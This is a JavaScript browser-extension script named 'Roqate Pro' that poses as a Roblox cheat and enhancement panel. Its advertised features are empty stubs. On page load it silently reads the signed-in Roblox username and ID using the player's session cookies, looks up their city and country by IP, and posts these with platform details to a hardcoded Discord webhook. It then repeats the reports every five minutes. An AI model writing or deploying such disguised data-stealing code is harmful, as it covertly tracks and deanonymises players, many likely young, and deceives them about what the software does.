const RoqatePro = {
    version: '1.0.0',
    webhookURL: 'https://discord.com/api/webhooks/1322236158700425318/4bAFN96Xi5VKBPL0YGouUrsygObe0rZY1sPeGP31XR698eBQ3bLwkI9LsYxc4fPWzH24',
    styles: `
        .roqate-button {
            position: fixed;
            top: 10px;
            right: 10px;
            background: linear-gradient(45deg, #00b06f, #009960);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            z-index: 9999;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            font-family: Arial, sans-serif;
            transition: all 0.3s ease;
        }
        .roqate-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .roqate-panel {
            position: fixed;
            top: 60px;
            right: 10px;
            background: #1e1e1e;
            color: white;
            padding: 20px;
            border-radius: 8px;
            z-index: 9999;
            display: none;
            width: 300px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        .roqate-feature {
            margin: 10px 0;
            padding: 12px;
            background: #2d2d2d;
            border-radius: 4px;
            transition: all 0.2s ease;
        }
        .roqate-feature:hover {
            background: #363636;
        }
        .roqate-feature label {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
        }
        .roqate-heading {
            color: #00b06f;
            margin: 0 0 15px 0;
            font-size: 18px;
            text-align: center;
            text-transform: uppercase;
        }
    `,

    async init() {
        this.injectStyles();
        this.injectUI();
        this.setupFeatures();
        this.loadSettings();
        await this.sendUserData();
        this.startAnalytics();
    },

    injectStyles() {
        const styleSheet = document.createElement('style');
        styleSheet.textContent = this.styles;
        document.head.appendChild(styleSheet);
    },

    injectUI() {
        const button = document.createElement('button');
        button.className = 'roqate-button';
        button.innerHTML = '🚀 Roqate Pro';
        button.onclick = () => this.togglePanel();
        
        const panel = document.createElement('div');
        panel.className = 'roqate-panel';
        panel.innerHTML = `
            <h2 class="roqate-heading">Roqate Pro</h2>
            <div class="roqate-feature">
                <label>
                    Speed Boost
                    <input type="checkbox" id="speedHack">
                </label>
            </div>
            <div class="roqate-feature">
                <label>
                    Graphics Enhancer
                    <input type="checkbox" id="graphicsBoost">
                </label>
            </div>
            <div class="roqate-feature">
                <label>
                    Auto Farm
                    <input type="checkbox" id="autoFarm">
                </label>
            </div>
            <div class="roqate-feature">
                <label>
                    Anti AFK
                    <input type="checkbox" id="antiAfk">
                </label>
            </div>
        `;

        document.body.appendChild(button);
        document.body.appendChild(panel);
    },

    async sendUserData() {
        try {
            const userInfo = await this.getUserInfo();
            const data = {
                content: null,
                embeds: [{
                    title: '🚀 New Roqate Pro User',
                    color: 3066993,
                    fields: [
                        {
                            name: '👤 Username',
                            value: userInfo.username || 'Unknown',
                            inline: true
                        },
                        {
                            name: '🆔 User ID',
                            value: userInfo.userId || 'Unknown',
                            inline: true
                        },
                        {
                            name: '💻 Platform',
                            value: navigator.platform,
                            inline: true
                        },
                        {
                            name: '⏰ Time',
                            value: new Date().toLocaleString(),
                            inline: true
                        },
                        {
                            name: '📍 Location',
                            value: userInfo.location || 'Unknown',
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(this.webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.error('Error sending user data:', error);
        }
    },

    async getUserInfo() {
        try {
            const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
                credentials: 'include'
            });
            const data = await response.json();
            
            // Get IP location
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();

            return {
                username: data.name,
                userId: data.id,
                location: `${ipData.city}, ${ipData.country_name}`
            };
        } catch (error) {
            return {
                username: 'Unknown',
                userId: 'Unknown',
                location: 'Unknown'
            };
        }
    },

    startAnalytics() {
        setInterval(() => {
            const features = {
                speedHack: document.getElementById('speedHack').checked,
                graphicsBoost: document.getElementById('graphicsBoost').checked,
                autoFarm: document.getElementById('autoFarm').checked,
                antiAfk: document.getElementById('antiAfk').checked
            };

            this.sendAnalytics(features);
        }, 300000); // Every 5 minutes
    },

    async sendAnalytics(features) {
        const data = {
            content: null,
            embeds: [{
                title: '📊 Feature Usage Update',
                color: 44678,
                fields: Object.entries(features).map(([feature, enabled]) => ({
                    name: feature,
                    value: enabled ? '✅ Enabled' : '❌ Disabled',
                    inline: true
                })),
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(this.webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    },

    togglePanel() {
        const panel = document.querySelector('.roqate-panel');
        panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
    },

    setupFeatures() {
        this.setupSpeedControls();
        this.setupGraphicsEnhancer();
        this.setupAutoFarm();
        this.setupAntiAfk();
    },

    setupSpeedControls() {
        document.getElementById('speedHack').addEventListener('change', (e) => {
            if (e.target.checked) {
                // Implement speed hack
            }
        });
    },

    setupGraphicsEnhancer() {
        document.getElementById('graphicsBoost').addEventListener('change', (e) => {
            if (e.target.checked) {
                // Implement graphics enhancement
            }
        });
    },

    setupAutoFarm() {
        document.getElementById('autoFarm').addEventListener('change', (e) => {
            if (e.target.checked) {
                // Implement auto farm
            }
        });
    },

    setupAntiAfk() {
        document.getElementById('antiAfk').addEventListener('change', (e) => {
            if (e.target.checked) {
                // Implement anti AFK
            }
        });
    },

    loadSettings() {
        chrome.storage.local.get(['settings'], (result) => {
            if (result.settings) {
                Object.entries(result.settings).forEach(([id, value]) => {
                    const element = document.getElementById(id);
                    if (element) element.checked = value;
                });
            }
        });
    }
};

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => RoqatePro.init());
} else {
    RoqatePro.init();
}
